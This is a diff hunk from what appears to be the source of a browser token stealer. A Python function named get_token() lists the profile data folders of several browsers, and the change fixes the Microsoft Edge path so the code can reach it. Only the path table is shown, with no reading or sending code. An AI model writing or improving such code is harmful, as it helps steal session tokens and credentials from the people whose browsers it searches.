@@ -82,7 +82,7 @@ def get_token():
         'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',
         'Chrome': chrome + 'Default',
         'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',
-        'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',
+        'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Default',
         'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
         'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
         'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
